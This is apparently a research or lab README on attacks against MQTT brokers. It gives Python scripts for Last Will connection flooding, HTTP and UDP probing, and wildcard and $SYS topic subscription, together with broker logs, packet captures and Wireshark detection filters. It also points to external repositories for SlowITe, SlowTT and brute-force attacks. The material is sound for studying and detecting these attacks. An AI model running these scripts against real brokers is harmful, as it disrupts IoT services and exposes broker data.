# MQTT Attacks

## SlowITe and Unauthorized Sub/Pub Flooding
To simulate the exploit, I utilized the following repository:
- Repository: [MQTT_SlowITe](https://github.com/gianluca2414/MQTT_SlowITe)
- Description: This repository contains the final project for the Data and System Security course at [University of Pisa](https://didattica.di.unipi.it/).
### Output 
#### SlowITe - Mosquitto.log
```bash
1713510949: New connection from 192.168.198.11:60807 on port 1883.
1713510949: New client connected from 192.168.198.11:60807 as Client_0 (p2, c1, k60).
1713510949: Client Client_0 disconnected.
1713510949: New connection from 192.168.198.11:56391 on port 1883.
1713510949: New client connected from 192.168.198.11:56391 as Client_1 (p2, c1, k60).
1713510949: Client Client_1 disconnected.
1713510949: New connection from 192.168.198.11:47365 on port 1883.
1713510949: New client connected from 192.168.198.11:47365 as Client_2 (p2, c1, k60).
1713510949: Client Client_2 disconnected.
1713510949: New connection from 192.168.198.11:53179 on port 1883.
1713510949: New client connected from 192.168.198.11:53179 as Client_3 (p2, c1, k60).
1713510949: Client Client_3 disconnected.
1713510949: New connection from 192.168.198.11:60291 on port 1883.
1713510949: New client connected from 192.168.198.11:60291 as Client_4 (p2, c1, k60).
1713510949: Client Client_4 disconnected.
```
##### Detection
- Rapid disconnections and reconnections from the same IP, suggesting attempts to keep connections open without legitimate transactions.
#### SlowITe - Mosquitto.log 2
```bash
1723045615: Client client1_1 has exceeded timeout, disconnecting.
```
##### Detection
- Logs indicating timeout errors, as the client does not complete the MQTT packet exchange.
#### SlowITe - Traffic
```bash
14:05:22.123456 IP 192.168.198.11.53000 > 192.168.191.10.1883: Flags [S], seq 123456789, win 64240, options [mss 1460,sackOK,TS val 123456 ecr 0,nop,wscale 7], length 0
14:05:22.124789 IP 192.168.191.10.1883 > 192.168.198.11.53000: Flags [S.], seq 987654321, ack 123456790, win 28960, options [mss 1460,sackOK,TS val 987654 ecr 123456,nop,wscale 7], length 0
14:06:22.123456 IP 192.168.198.11.53000 > 192.168.191.10.1883: Flags [.], ack 1, win 229, options [nop,nop,TS val 123457 ecr 987654], length 0
```
```bash
No.     Time        Source          Destination     Protocol Length Info
1       0.000000    192.168.198.11  192.168.191.10  TCP      74     53000 → 1883 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=123456 TSecr=0 WS=128
2       0.001333    192.168.191.10  192.168.198.11  TCP      74     1883 → 53000 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=987654 TSecr=123456 WS=128
3       60.000000   192.168.198.11  192.168.191.10  TCP      66     53000 → 1883 [ACK] Seq=1 Ack=1 Win=229 Len=0 TSval=123457 TSecr=987654
```
##### Detection

- Wireshark Filter: tcp.flags.syn == 1 and tcp.flags.ack == 0 (for SYN) and tcp.flags.syn == 1 and tcp.flags.ack == 1 (for SYN-ACK)
- Wireshark Filter: ip.src == 192.168.198.11 && tcp.port == 1883
    - SYN packet from client 192.168.198.11 initiating the connection.
    - SYN-ACK packet from the server 192.168.191.10 acknowledging the SYN.
    - ACK packet from the client acknowledging the SYN-ACK but without further data transmission, or missing ACKs, indicating incomplete session establishment.


## SlowTT
This exploit is used in my research paper [1], where I utilized it for my detection methods. The exploit code can be found on GitHub [2].

[1] Vaccari, I., Aiello, M., & Cambiaso, E. (2020). *SlowTT: A Slow Denial of Service against IoT Networks.* Inf., 11, 452.

[2] GenjiM1n4moto. (Year). *SlowTT-Attack* [GitHub Repository]. Retrieved from https://github.com/GenjiM1n4moto/SlowTT-Attack

## Connect Flooding
To simulate the exploit, I utilized the following repository:
- Repository: [MQTT_SlowITe](https://github.com/gianluca2414/MQTT_SlowITe)
- Description: This repository contains the final project for the Data and System Security course at [University of Pisa](https://didattica.di.unipi.it/).

## Last Will Payload
The attack mechanism simulates a test condition for the broker to handle connections and Last Will messages from a large number of clients rapidly connecting and disconnecting.

### Requirements
+ This attack is simulated using `Python 3.11.8`.
+ In the attack, three libraries are imported
    * `paho.mqtt.client`: This library is essential for MQTT communication, enabling the creation and management of MQTT client connections, publishing messages, and subscribing to topics. To install this module click [hier](https://eclipse.dev/paho/index.php?page=clients/python/index.php).
    * `time`: This standard Python library is used for its sleep function, which introduces delays in this case, 0.1 seconds between client connections and disconnections, effectively simulating rapid client turnover and testing the broker's handling of last will messages.
    * `random`: The library is also imported but not used in the given code snippet
### Exploit    
```python
import random
import paho.mqtt.client as mqtt
import time

def connect_client(client_id, will_topic, broker_address="127.0.0.1"):
    client = mqtt.Client(client_id)
    client.will_set(will_topic, payload="Last Will Message", qos=1, retain=False)
    client.connect(broker_address, 1883, 60)
    return client

def main():
    broker_address = "127.0.0.1"
    will_topic = "test/lastwill"

    clients = []
    try:
        for i in range(1000):  # range for the flooding effect
            client_id = f"Client_{i}"
            client = connect_client(client_id, will_topic, broker_address)
            clients.append(client)
            time.sleep(0.1)
            client.disconnect() # disconnect after 0.1 connecting to trigger the Last Will message
    finally:
        for client in clients:
            client.loop_stop()

if __name__ == '__main__':
    main()
```
### Functionality
The function `connect_client()` takes the parameters `client_id`, `will_topic`, and `broker_address`. It creates an MQTT client with a unique ID and sets up a last will message on `will_topic`, In the `will_set` method, the `qos` parameter is set to `1`. This ensures that messages are delivered at least once and the `retain` flag is set to `False`,means the broker does not retain the message. Finally, it connects to the broker at the loopback address using the default MQTT port. Iterates to create 1000 clients. Each client is connected and then quickly disconnected after a 0.1-second pause, triggering the broker to send the last will message.

## ACK-PSH Flooding
To explore the ACK-PSH flooding technique, I referred to the following repository:

- Repository: [460FinalDDoSAttacks](https://github.com/uiucseclab/460FinalDDoSAttacks)

## HTTP Requests Misinterpreted
The code serves as an attempt to send an HTTP request to an MQTT broker, exploiting a possible misconfiguration in the broker's handling of unexpected protocol messages
### Requirements
+ This attack is simulated using `Python 3.11.8`.
+ In the attack, `socket` librarie is imported: 
    * Module is used, which provides the standard BSD sockets API, allowing for network communication via TCP and UDP protocols. It's fundamental for establishing connections, sending, and receiving data over the network.
### Exploit
```python
import socket

broker_address = "127.0.0.1"
broker_port = 1883

def send_http_request_as_mqtt(broker_address, broker_port):
    # socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((broker_address, broker_port))

    # HTTP request
    http_request = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(broker_address)
    
    try:
        # sending HTTP request to MQTT port
        sock.sendall(http_request.encode())
        response = sock.recv(1024)  # Receiving the response from the server
        print("Received:", response.decode())
    finally:
        sock.close()

send_http_request_as_mqtt(broker_address, broker_port)
```
### Functionality
This Exploit is designed to open a socket connection to the specified MQTT broker and send a formatted HTTP request instead of using the MQTT protocol. The socket is created using socket.`socket(socket.AF_INET, socket.SOCK_STREAM)`, which specifies an IPv4 address and a TCP socket. An HTTP GET request is created as a string with headers indicating it's an HTTP/1.1 request. The Host header is set to the broker's address. This string is then encoded to bytes and sent over the established connection.
### Output
```bash
1713516729: New connection from 127.0.0.1:50058 on port 1883.
1713516729: Client <unknown> disconnected due to protocol error.
```
## UDP MQTT Requests
MQTT is typically designed to work over TCP/IP, which ensures reliable, ordered, and error-checked delivery of a stream of packets on the network. By default, MQTT does not operate over UDP because UDP does not guarantee message delivery, ordering, or error handling.

### Requirements
+ This attack is simulated using `Python 3.11.8`.
+ In the attack, `socket` librarie is imported: 
    * Module is used, which provides the standard BSD sockets API, allowing for network communication via TCP and UDP protocols. It's fundamental for establishing connections, sending, and receiving data over the network.
### Exploit
```python
import socket

def send_mqtt_over_udp(broker_address, broker_port):
    # UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # MQTT Connect Packet
    mqtt_connect_packet = bytearray([
        0x10, 0x0c,  # Fixed header: Connect, remaining length
        0x00, 0x04,  # Protocol Name length
        ord('M'), ord('Q'), ord('T'), ord('T'),  # Protocol Name: MQTT
        0x04,  # Protocol Level: 4
        0x02,  # Connect Flags: Clean session
        0x00, 0x0a,  # Keep Alive: 10 seconds
        0x00, 0x00   # Client Identifier (0 length indicating a random one should be assigned)
    ])

    try:
        # MQTT  over UDP
        sock.sendto(mqtt_connect_packet, (broker_address, broker_port))
        print(f"Sent MQTT packet over UDP to {broker_address}:{broker_port}")
    finally:
        sock.close()

broker_address = "127.0.0.1"
broker_port = 1883

send_mqtt_over_udp(broker_address, broker_port)
```
### Functionality
The script creates a UDP socket using Python's socket module. This allows it to send packets over the network using constructed as a `bytearray`. This array is not the MQTT protocol standards but is designed to mimic a connect packet:
To understand the MQTT packet structure and the definition in detail, [hier](https://cedalo.com/blog/mqtt-packet-guide/#MQTT_Packet_structure) is explained in detail MQTT_Packet_structure.
* Fixed header with message type (Connect) and remaining length.
    + 0x10 (16 in decimal): This is the MQTT packet type and flags.
    + CONNECT packet is 1 (binary 0001).
    + The remaining bits are flags, typically set to 0000 for a CONNECT packet.
* Protocol name ("MQTT") and version.
    + This 2-byte sequence tells the length of the following protocol name. 0x04 indicates that the next four bytes will be the protocol name.
    + These are the ASCII values of the characters "MQTT", which is the protocol name. ord('M') gives 77, ord('Q') gives 81, and ord('T') gives 84
    + This byte indicates the protocol version. 0x04 corresponds to MQTT
* Connect flags, including clean session.
    + This byte includes multiple flags packed together. 0x02 specifically indicates that the Clean Session flag is set.
* Keep-alive timer.
    + This 2-byte integer specifies the maximum time interval in seconds that should elapse between the client sending messages to the broker. Here 0x0a (10 in decimal) means 10 seconds.
* Client Identifier (0x00, 0x00)

### Output
```bash
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
16:23:17.231579 IP (tos 0x0, ttl 64, id 20326, offset 0, flags [DF], proto UDP (17), length 42)
    192.168.198.11.52370 > 192.168.198.10.1883: UDP, length 14
```
## Cross-Topic Type Requests
The exploit attempts to subscribe to a wide and possibly disruptive range of topics. Here's a breakdown of why these topics might be considered "malicious" or at least unusual, and their potential implications:
+ "/#": This is a subscription to all topics in the MQTT system. Using the # wildcard subscribes to everything from the root level, potentially resulting in a massive amount of traffic that the broker sends to the client, which could overload both the broker and the client.
+ "+/test": The + wildcard substitutes for exactly one topic level. This subscription listens for any topic that has test as the second level, such as anything/test or something/test. It's a way to broadly capture topics under various first-level categories.
+ "/+/topic": Similar to the previous one, this listens for any topic that fits the pattern where there is any single-level topic followed by /topic, such as /user/topic or /data/topic.
+ "test/#": This subscribes to test and any subtopics under it, due to the # wildcard at the end. It could be used to capture all messages under a common topic grouping, potentially causing unnecessary data flow if test is a common topic prefix.
+ "$SYS/#": This targets the broker's internal status and metrics topics, which typically start with $SYS/. Subscribing to this topic could be considered sensitive or disruptive because it might expose broker internals or statistics that are not meant for broad distribution.
+ "/\x00/test" and "/\xFF/test": These topics include non-printable characters (like NULL \x00 and ÿ \xFF). They test how the broker handles unusual or potentially non-compliant topic strings, which might trigger bugs or unexpected behavior in less robust or incorrectly implemented MQTT systems.

This part of the term suggests that the subscriptions are crossing normal or typical boundaries set for topic subscriptions. Normally, MQTT clients subscribe to topics that they have a legitimate reason to receive messages from. In the "malicious_topics" scenario, the client subscribes across a broad range of topic patterns and types, including potentially every possible topic in the broker. 
### Requirements
+ This attack is simulated using `Python 3.11.8`.
+ In the attack, three libraries are imported
    * `paho.mqtt.client`: This library is essential for MQTT communication, enabling the creation and management of MQTT client connections, publishing messages, and subscribing to topics. To install this module click [hier](https://eclipse.dev/paho/index.php?page=clients/python/index.php).
    * `random`: The library is also imported but not used in the given code snippet
### Exploit
```python
import random
import paho.mqtt.client as mqtt

def on_connect(client, userdata, flags, rc):
    print(f"Connected with result code {rc}")
    malicious_topics = ["test/#", "$SYS/#", "/\x00/test", "/\xFF/test"]
    for topic in malicious_topics:
        client.subscribe(topic)
        print(f"Subscribed to {topic}")

def on_message(client, userdata, msg):
    print(f"Message from {msg.topic}: {msg.payload.decode()}")

broker_address = "127.0.0.1"
client = mqtt.Client("AttackerClient")
client.on_connect = on_connect
client.on_message = on_message

client.connect(broker_address, 1883, 60)
client.loop_forever()
```
### Functionality
This function, exploit sets up an MQTT client to connect to a broker and subscribe to a range of potentially disruptive or informative topics. It's designed to exploit the broker's handling of these subscriptions, revealing how well the broker manages extensive, sensitive, or non-standard topic requests.

### Output
```bash
1713539235: New connection from 127.0.0.1:59707 on port 1883.
1713539235: New client connected from 127.0.0.1:59707 as AttackerClient (p2, c1, k60).
1713539235: Client AttackerClient disconnected due to malformed packet.
1713539236: New connection from 127.0.0.1:34187 on port 1883.
1713539236: New client connected from 127.0.0.1:34187 as AttackerClient (p2, c1, k60).
1713539236: Client AttackerClient disconnected due to malformed packet.
```
## Brute-Force, Topic enumeration and Elevation of Privilege (EoP)
To simulate the exploit, I utilized the following repository, Use Trickest to easily build and automate workflows powered by the world's most advanced community tools. [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/1883-pentesting-mqtt-mosquitto)

### Output
```bash
1713878665: New connection from 127.0.0.1:59733 on port 1883.
1713878665: New client connected from 127.0.0.1:59733 as auto-37186284-FF40-36F2-21A2-A23C2C333967 (p2, c1, k60, u'normaluser').
1713878949: Client auto-37186284-FF40-36F2-21A2-A23C2C333967 closed its connection.
1713878978: New connection from 127.0.0.1:38485 on port 1883.
1713878978: New client connected from 127.0.0.1:38485 as + (p2, c1, k60, u'testuser').
```
## Payload Remaining Length
Vulnerability: MQTT Payload Remaining Length (CVE-2018-17614)

## Unicode Handling in Topic Strings
Vulnerability: MQTT Unicode Handling in Topic Strings (CVE-2017-7653)

## URI-Style Topic Validation
Vulnerability: MQTT URI-Style Topic Validation (CVE-2018-11615)

#### Attention
Loopback IP is used as the IP address here in this code, which can be changed by writing the desired IP address
